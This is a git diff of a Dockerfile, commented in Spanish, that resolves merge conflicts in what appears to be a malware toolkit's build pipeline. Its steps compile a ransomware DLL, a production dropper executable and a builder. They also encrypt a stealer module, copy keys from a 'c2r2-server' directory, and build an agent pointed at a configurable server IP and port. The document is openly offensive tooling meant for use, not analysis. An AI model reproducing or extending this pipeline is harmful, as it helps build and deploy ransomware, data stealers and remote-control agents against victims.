@@ -73,7 +73,6 @@ RUN echo " Compilando ransomware.dll..." && \
     cp target/x86_64-pc-windows-gnu/release/ransomware.dll /build_output/ransomware.dll && \
     echo " Ransomware DLL compilado: /build_output/ransomware.dll"
 
-<<<<<<< HEAD
 # 4a. Compilar el builder (Linux x86_64)
 RUN echo "🔨 Compilando builder (x86_64)..." && \
     cargo build --release --target x86_64-unknown-linux-gnu --package builder && \
@@ -94,14 +93,6 @@ RUN echo "🔨 Compilando dropper..." && \
     cargo build --release --target x86_64-pc-windows-gnu --package dropper --features production && \
     cp target/x86_64-pc-windows-gnu/release/dropper.exe /build_output/dropper.exe && \
     echo "✅ Dropper compilado: /build_output/dropper.exe"
-=======
-# 4. Compilar el builder (Linux)
-RUN echo " Compilando builder..." && \
-    cargo build --release --target x86_64-unknown-linux-gnu --package builder && \
-    cp target/x86_64-unknown-linux-gnu/release/builder /build_output/builder && \
-    chmod +x /build_output/builder && \
-    echo " Builder compilado: /build_output/builder"
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
 # 5. Encriptar módulos usando el builder
 RUN echo " Encriptando módulo stealer..." && \
@@ -118,7 +109,6 @@ RUN mkdir -p /build_output/modules && \
     cp c2r2-server/modules/*.key /build_output/modules/ 2>/dev/null || true && \
     echo " Módulos encriptados copiados a /build_output/modules"
 
-<<<<<<< HEAD
 # 7. Configurar variables de entorno para winres con llvm-rc
 ENV RC=llvm-rc \
     AR_x86_64_pc_windows_gnu=llvm-ar \
@@ -126,10 +116,6 @@ ENV RC=llvm-rc \
 
 # 8. Compilar el agente con configuración específica
 RUN echo "🔨 Compilando agente con servidor ${SERVER_IP}:${SERVER_PORT}..." && \
-=======
-# 7. Compilar el agente con configuración específica
-RUN echo " Compilando agente con servidor ${SERVER_IP}:${SERVER_PORT}..." && \
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     if [ "$PRODUCTION_MODE" = "true" ]; then \
         /build_output/builder build-agent \
             --name "${AGENT_NAME}" \
